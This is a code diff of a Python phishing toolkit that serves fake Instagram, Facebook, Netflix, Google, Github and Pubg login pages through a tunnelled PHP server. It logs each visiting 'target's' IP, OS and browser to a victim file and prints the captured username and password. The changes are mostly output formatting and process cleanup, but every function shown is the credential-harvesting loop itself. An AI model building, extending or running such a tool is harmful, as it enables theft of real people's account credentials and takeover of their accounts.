@@ -71,13 +71,14 @@ if check != 0:
     print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
     sys.exit()
 
+def clear():
+    if os.name == "nt":
+        os.system("cls")
+        
+    else:
+        os.system("clear")
 
-if os.name == "nt":
-    os.system("cls")
-    pass
-else:
-    os.system("clear")
-    pass
+clear()
 sleep(0.1)
 
 
@@ -151,13 +152,11 @@ def instagram():
 
     sleep(8)
 
-
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    linecache.clearcache()
-
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    print("")
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -169,9 +168,9 @@ def instagram():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     sleep(1)
                     df = pd.read_json(r"info.json")
@@ -184,7 +183,7 @@ def instagram():
                     open("info.json" , "w").close()
                     victim_file.close()
 
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     break
 
     except KeyboardInterrupt:
@@ -196,7 +195,7 @@ def instagram():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open("username_key.txt")  
@@ -213,7 +212,7 @@ def instagram():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open("password_key.txt")  
@@ -231,7 +230,6 @@ def instagram():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 
@@ -259,7 +257,9 @@ def facebook():
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    print("")
+
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -271,9 +271,9 @@ def facebook():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
@@ -284,7 +284,7 @@ def facebook():
                     open("info.json" , "w").close()
                     victim_file.close()
 
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
                     break
 
@@ -297,7 +297,7 @@ def facebook():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -314,7 +314,7 @@ def facebook():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -332,7 +332,6 @@ def facebook():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
   
 #option 3 ====================================================================================================
@@ -360,7 +359,9 @@ def netflix():
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    print("")
+
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -372,9 +373,9 @@ def netflix():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
@@ -386,7 +387,7 @@ def netflix():
                     victim_file.close()
 
                     
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
     
                     break
     except KeyboardInterrupt:
@@ -398,7 +399,7 @@ def netflix():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -415,7 +416,7 @@ def netflix():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(9)
-                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -433,7 +434,6 @@ def netflix():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 
@@ -461,7 +461,9 @@ def Google():
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    print("")
+
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -473,9 +475,9 @@ def Google():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
@@ -487,7 +489,7 @@ def Google():
                     victim_file.close()
                     
                 
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
                     break
 
@@ -501,7 +503,7 @@ def Google():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -518,7 +520,7 @@ def Google():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(9)
-                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -536,7 +538,6 @@ def Google():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
    
 #option 5 ====================================================================================================
@@ -564,7 +565,9 @@ def Github():
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    print("")
+
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -576,9 +579,9 @@ def Github():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     sleep(1)
                     df = pd.read_json(r"info.json")
@@ -591,7 +594,7 @@ def Github():
                     open("info.json" , "w").close()
                     victim_file.close()
 
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
                     break
 
@@ -604,7 +607,7 @@ def Github():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -621,7 +624,7 @@ def Github():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -640,8 +643,8 @@ def Github():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
+
 #option 6 ====================================================================================================
 def Pubg():
     global port
@@ -649,7 +652,7 @@ def Pubg():
     os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
+        port = input(Fore.MAGENTA + "\nWhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
             exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
@@ -667,7 +670,7 @@ def Pubg():
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
     try:
@@ -679,9 +682,9 @@ def Pubg():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
 
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     sleep(1)
                     df = pd.read_json(r"info.json")
@@ -695,7 +698,7 @@ def Pubg():
                     victim_file.close()
 
                 
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
                     break
 
@@ -708,7 +711,7 @@ def Pubg():
         if size.st_size != 0:
             with open("username_key.txt" , "r") as user:
                 sleep(10)
-                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
                 #clear username.txt file
                 username =open('username_key.txt')  
@@ -725,7 +728,7 @@ def Pubg():
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
                 sleep(10)
-                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
                 pwd =open('password_key.txt')  
@@ -743,7 +746,6 @@ def Pubg():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     
 #Run functions ====================================================================================================
@@ -751,10 +753,11 @@ if ask == "0":
     zero_exit()
 
 if ask == "00":
-
-    path_app = os.getcwd()
-    subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")
-
+    if os.name == "nt":
+        path_app = os.getcwd()
+        subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")
+    else:
+        print("Sorry this option wont work on your device")
 if ask == "1":
     instagram()
 
